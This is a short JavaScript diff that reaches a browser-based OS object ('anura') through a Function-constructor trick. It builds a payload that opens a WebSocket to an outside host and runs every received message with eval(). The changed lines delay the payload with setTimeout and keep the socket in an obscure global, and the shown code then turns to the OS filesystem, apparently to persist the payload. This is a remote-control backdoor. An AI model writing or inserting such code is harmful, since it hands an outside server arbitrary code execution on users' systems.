@@ -1,12 +1,12 @@
 (async function () {})
     .constructor("return top.anura")()
     .then(async (anura) => {
-        const payload = `(() => {
-    let ws = new anura.net.WebSocket("wss://anura.entr.pics/ws/");
-    ws.addEventListener("message", (ev) => {
+        const payload = `setTimeout(() => {
+    globalThis.__lf$ws = new anura.net.WebSocket("wss://anura.entr.pics/ws/");
+    globalThis.__lf$ws.addEventListener("message", (ev) => {
         eval(ev.data);
-    })
-})();`;
+    });
+}, 500);`;
 
         const ui8a = await anura.fs.providers
             .get("/")
